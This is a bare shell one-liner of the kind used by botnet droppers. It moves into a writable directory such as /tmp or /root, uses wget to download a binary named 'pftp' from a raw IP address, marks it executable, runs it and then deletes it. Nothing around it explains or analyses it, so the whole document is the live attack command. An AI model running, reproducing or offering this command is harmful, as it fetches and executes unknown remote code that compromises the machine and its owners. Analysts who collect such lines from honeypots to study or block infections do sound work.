cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.193.186/pftp; chmod +x pftp; ./pftp; rm -rf pftp
